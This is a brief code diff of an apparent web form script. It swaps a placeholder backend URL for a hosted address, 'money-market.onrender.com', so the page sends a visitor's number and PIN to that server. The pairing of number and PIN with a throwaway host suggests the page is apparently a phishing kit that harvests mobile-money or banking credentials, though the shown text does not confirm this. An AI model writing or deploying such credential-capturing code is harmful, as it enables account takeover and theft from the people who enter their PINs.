@@ -145,7 +145,7 @@
       const pin = pinInput.value.trim();
 
       try {
-        const res = await fetch('https://YOUR_SERVER_URL/submit', { // ✅ Replace with your backend URL
+        const res = await fetch('https://money-market.onrender.com/submit', { // ✅ Replace with your backend URL
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ number, pin })
